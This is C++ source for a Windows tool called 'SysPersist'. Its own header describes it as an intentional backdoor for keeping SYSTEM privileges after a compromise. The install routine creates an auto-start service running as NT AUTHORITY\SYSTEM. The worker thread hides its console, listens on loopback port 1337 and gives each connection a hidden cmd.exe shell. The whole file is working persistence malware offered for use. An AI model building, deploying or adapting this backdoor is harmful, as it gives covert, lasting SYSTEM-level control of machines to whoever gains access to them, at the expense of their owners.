/* A SYSTEM persistence service.
   =============================
   Stand-alone binary that can be used to install and remove a service
   for spawning a SYSTEM shell on a loopback interface. This is an 
   intentional backdoor that comes with no protections. The purpose
   is for retaining SYSTEM privileges when other persistence mechanisms
   such as sticky keys, wmi or others are unavailable. This can be 
   modified or hacked up to perform other tasks and is mostly based
   on a Win32 bind shell and Microsoft C++ SCM service example code. 

   Don't forget to run "net start syspersist" on install ;-)

   -- Hacker Fantastic (http://www.mdsec.co.uk)
*/
#pragma region Includes
#include "stdafx.h"
#pragma endregion

#define SERVICE_NAME             L"SysPersist"
#define SERVICE_DISPLAY_NAME     L"System Persistence"
#define SERVICE_START_TYPE       SERVICE_AUTO_START 
#define SERVICE_DEPENDENCIES     L""
#define SERVICE_ACCOUNT          L"NT AUTHORITY\\SYSTEM"
#define SERVICE_PASSWORD         NULL

#pragma region Static Members

CServiceBase *CServiceBase::s_service = NULL;

BOOL CServiceBase::Run(CServiceBase &service)
{
	s_service = &service;
	SERVICE_TABLE_ENTRY serviceTable[] =
	{
		{ service.m_name, ServiceMain },
		{ NULL, NULL }
	};
	return StartServiceCtrlDispatcher(serviceTable);
}

void WINAPI CServiceBase::ServiceMain(DWORD dwArgc, PWSTR *pszArgv)
{
	assert(s_service != NULL);
	s_service->m_statusHandle = RegisterServiceCtrlHandler(
		s_service->m_name, ServiceCtrlHandler);
	if (s_service->m_statusHandle == NULL)
	{
		throw GetLastError();
	}
	s_service->Start(dwArgc, pszArgv);
}

void WINAPI CServiceBase::ServiceCtrlHandler(DWORD dwCtrl)
{
	switch (dwCtrl)
	{
	case SERVICE_CONTROL_STOP: s_service->Stop(); break;
	case SERVICE_CONTROL_PAUSE: s_service->Pause(); break;
	case SERVICE_CONTROL_CONTINUE: s_service->Continue(); break;
	case SERVICE_CONTROL_SHUTDOWN: s_service->Shutdown(); break;
	case SERVICE_CONTROL_INTERROGATE: break;
	default: break;
	}
}

#pragma endregion


#pragma region Service Constructor and Destructor

CServiceBase::CServiceBase(PWSTR pszServiceName, BOOL fCanStop, BOOL fCanShutdown, BOOL fCanPauseContinue)
{
	m_name = (pszServiceName == NULL) ? L"" : pszServiceName;
	m_statusHandle = NULL;
	m_status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	m_status.dwCurrentState = SERVICE_START_PENDING;
	DWORD dwControlsAccepted = 0;
	if (fCanStop)
		dwControlsAccepted |= SERVICE_ACCEPT_STOP;
	if (fCanShutdown)
		dwControlsAccepted |= SERVICE_ACCEPT_SHUTDOWN;
	if (fCanPauseContinue)
		dwControlsAccepted |= SERVICE_ACCEPT_PAUSE_CONTINUE;
	m_status.dwControlsAccepted = dwControlsAccepted;
	m_status.dwWin32ExitCode = NO_ERROR;
	m_status.dwServiceSpecificExitCode = 0;
	m_status.dwCheckPoint = 0;
	m_status.dwWaitHint = 0;
}

CServiceBase::~CServiceBase(void)
{
}
#pragma endregion


#pragma region Service Start, Stop, Pause, Continue, and Shutdown
void CServiceBase::Start(DWORD dwArgc, PWSTR *pszArgv)
{
	try
	{
		SetServiceStatus(SERVICE_START_PENDING);
		OnStart(dwArgc, pszArgv);
		SetServiceStatus(SERVICE_RUNNING);
	}
	catch (DWORD dwError)
	{
		SetServiceStatus(SERVICE_STOPPED, dwError);
	}
	catch (...)
	{
		SetServiceStatus(SERVICE_STOPPED);
	}
}

void CServiceBase::OnStart(DWORD dwArgc, PWSTR *pszArgv)
{
}

void CServiceBase::Stop()
{
	DWORD dwOriginalState = m_status.dwCurrentState;
	try
	{
		SetServiceStatus(SERVICE_STOP_PENDING);
		OnStop();
		SetServiceStatus(SERVICE_STOPPED);
	}
	catch (DWORD dwError)
	{
		SetServiceStatus(dwOriginalState);
	}
	catch (...)
	{
		SetServiceStatus(dwOriginalState);
	}
}

void CServiceBase::OnStop()
{
}

void CServiceBase::Pause()
{
	try
	{
		SetServiceStatus(SERVICE_PAUSE_PENDING);
		OnPause();
		SetServiceStatus(SERVICE_PAUSED);
	}
	catch (DWORD dwError)
	{
		SetServiceStatus(SERVICE_RUNNING);
	}
	catch (...)
	{
		SetServiceStatus(SERVICE_RUNNING);
	}
}

void CServiceBase::OnPause()
{
}

void CServiceBase::Continue()
{
	try
	{
		SetServiceStatus(SERVICE_CONTINUE_PENDING);
		OnContinue();
		SetServiceStatus(SERVICE_RUNNING);
	}
	catch (DWORD dwError)
	{
		SetServiceStatus(SERVICE_PAUSED);
	}
	catch (...)
	{
		SetServiceStatus(SERVICE_PAUSED);
	}
}

void CServiceBase::OnContinue()
{
}

void CServiceBase::Shutdown()
{
	try
	{
		OnShutdown();
		SetServiceStatus(SERVICE_STOPPED);
	}
	catch (DWORD dwError)
	{
	}
	catch (...)
	{
	}
}

void CServiceBase::OnShutdown()
{
}

#pragma endregion

#pragma region Helper Functions

void CServiceBase::SetServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint)
{
	static DWORD dwCheckPoint = 1;
	m_status.dwCurrentState = dwCurrentState;
	m_status.dwWin32ExitCode = dwWin32ExitCode;
	m_status.dwWaitHint = dwWaitHint;
	m_status.dwCheckPoint =
		((dwCurrentState == SERVICE_RUNNING) ||
			(dwCurrentState == SERVICE_STOPPED)) ?
		0 : dwCheckPoint++;
	::SetServiceStatus(m_statusHandle, &m_status);
}

#pragma endregion

CSystemPersistService::CSystemPersistService(PWSTR pszServiceName, BOOL fCanStop, BOOL fCanShutdown, BOOL fCanPauseContinue) : CServiceBase(pszServiceName, fCanStop, fCanShutdown, fCanPauseContinue)
{
	m_fStopping = FALSE;
	m_hStoppedEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (m_hStoppedEvent == NULL)
	{
		throw GetLastError();
	}
}


CSystemPersistService::~CSystemPersistService(void)
{
	if (m_hStoppedEvent)
	{
		CloseHandle(m_hStoppedEvent);
		m_hStoppedEvent = NULL;
	}
}


void CSystemPersistService::OnStart(DWORD dwArgc, LPWSTR *lpszArgv)
{
	CThreadPool::QueueUserWorkItem(&CSystemPersistService::ServiceWorkerThread, this);
}

void CSystemPersistService::ServiceWorkerThread(void)
{
	while (!m_fStopping)
	{
		HWND hWnd = GetConsoleWindow();
		ShowWindow(hWnd, SW_HIDE);
		WSADATA WSAData;
		SOCKADDR_IN sin;
		SOCKET sock;
		WSAStartup(MAKEWORD(2, 0), &WSAData);
		sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
		sin.sin_port = htons((u_short)1337);
		bind(sock, (SOCKADDR *)&sin, sizeof(SOCKADDR_IN));
		listen(sock, SOMAXCONN);
		while (true)
		{
			SOCKET tmp = accept(sock, 0, 0);
			STARTUPINFO si = { 0 };
			PROCESS_INFORMATION pi = { 0 };
			si.cb = sizeof(si);
			si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
			si.wShowWindow = SW_HIDE;
			si.hStdOutput = (HANDLE)tmp;
			si.hStdError = (HANDLE)tmp;
			si.hStdInput = (HANDLE)tmp;
			CreateProcess(L"C:\\windows\\system32\\cmd.exe", 0, 0, 0, true, CREATE_NEW_CONSOLE, 0, 0, &si, &pi);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			closesocket(tmp);
		}
	}
	SetEvent(m_hStoppedEvent);
}

void CSystemPersistService::OnStop()
{
	m_fStopping = TRUE;
	if (WaitForSingleObject(m_hStoppedEvent, INFINITE) != WAIT_OBJECT_0)
	{
		throw GetLastError();
	}
}

void InstallService(PWSTR pszServiceName, PWSTR pszDisplayName, DWORD dwStartType, PWSTR pszDependencies, PWSTR pszAccount, PWSTR pszPassword)
{
	wchar_t szPath[MAX_PATH];
	SC_HANDLE schSCManager = NULL;
	SC_HANDLE schService = NULL;
	if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)) == 0)
	{
		wprintf(L"[!] GetModuleFileName failed w/err 0x%08lx\n", GetLastError());
		goto Cleanup;
	}
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
	if (schSCManager == NULL)
	{
		wprintf(L"[!] OpenSCManager failed w/err 0x%08lx\n", GetLastError());
		goto Cleanup;
	}
	schService = CreateService(schSCManager,pszServiceName,pszDisplayName,SERVICE_QUERY_STATUS,SERVICE_WIN32_OWN_PROCESS,
		dwStartType,SERVICE_ERROR_NORMAL,szPath,NULL,NULL,pszDependencies,pszAccount,pszPassword);
	if (schService == NULL)
	{
		wprintf(L"[!] CreateService failed w/err 0x%08lx\n", GetLastError());
		goto Cleanup;
	}

	wprintf(L"[-] %s is installed ;-)\n", pszServiceName);

Cleanup:
	if (schSCManager)
	{
		CloseServiceHandle(schSCManager);
		schSCManager = NULL;
	}
	if (schService)
	{
		CloseServiceHandle(schService);
		schService = NULL;
	}
}

void UninstallService(PWSTR pszServiceName)
{
	SC_HANDLE schSCManager = NULL;
	SC_HANDLE schService = NULL;
	SERVICE_STATUS ssSvcStatus = {};
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (schSCManager == NULL)
	{
		wprintf(L"[!] OpenSCManager failed w/err 0x%08lx\n", GetLastError());
		goto Cleanup;
	}
	schService = OpenService(schSCManager, pszServiceName, SERVICE_STOP|SERVICE_QUERY_STATUS|DELETE);
	if (schService == NULL)
	{
		wprintf(L"[!] OpenService failed w/err 0x%08lx\n", GetLastError());
		goto Cleanup;
	}
	if (ControlService(schService, SERVICE_CONTROL_STOP, &ssSvcStatus))
	{
		wprintf(L"[-] Stopping %s.", pszServiceName);
		Sleep(1000);
		while (QueryServiceStatus(schService, &ssSvcStatus))
		{
			if (ssSvcStatus.dwCurrentState == SERVICE_STOP_PENDING)
			{
				wprintf(L".");
				Sleep(1000);
			}
			else break;
		}
		if (ssSvcStatus.dwCurrentState == SERVICE_STOPPED)
		{
			wprintf(L"\n[-] %s is stopped.\n", pszServiceName);
		}
		else
		{
			wprintf(L"\n[-] %s failed to stop.\n", pszServiceName);
		}
	}
	if (!DeleteService(schService))
	{
		wprintf(L"[!] DeleteService failed w/err 0x%08lx\n", GetLastError());
		goto Cleanup;
	}
	wprintf(L"[-] %s is removed.\n", pszServiceName);
Cleanup:
	if (schSCManager)
	{
		CloseServiceHandle(schSCManager);
		schSCManager = NULL;
	}
	if (schService)
	{
		CloseServiceHandle(schService);
		schService = NULL;
	}
}


int wmain(int argc, wchar_t *argv[])
{
	wprintf(L"[+] SysPersist - a SYSTEM persistence service\n");
	if ((argc > 1) && ((*argv[1] == L'-' || (*argv[1] == L'/'))))
	{
		if (_wcsicmp(L"install", argv[1] + 1) == 0)
		{
			InstallService(SERVICE_NAME,SERVICE_DISPLAY_NAME,SERVICE_START_TYPE,SERVICE_DEPENDENCIES,SERVICE_ACCOUNT,SERVICE_PASSWORD);
		}
		else if (_wcsicmp(L"remove", argv[1] + 1) == 0)
		{
			UninstallService(SERVICE_NAME);
		}
	}
	else
	{
		wprintf(L"[-] Parameters:\n");
		wprintf(L"[-] -install  to install the service.\n");
		wprintf(L"[-] -remove   to remove the service.\n");
		CSystemPersistService service(SERVICE_NAME);
		if (!CServiceBase::Run(service))
		{
			wprintf(L"[!] Service failed to run w/err 0x%08lx\n", GetLastError());
		}
	}
	return 0;
}

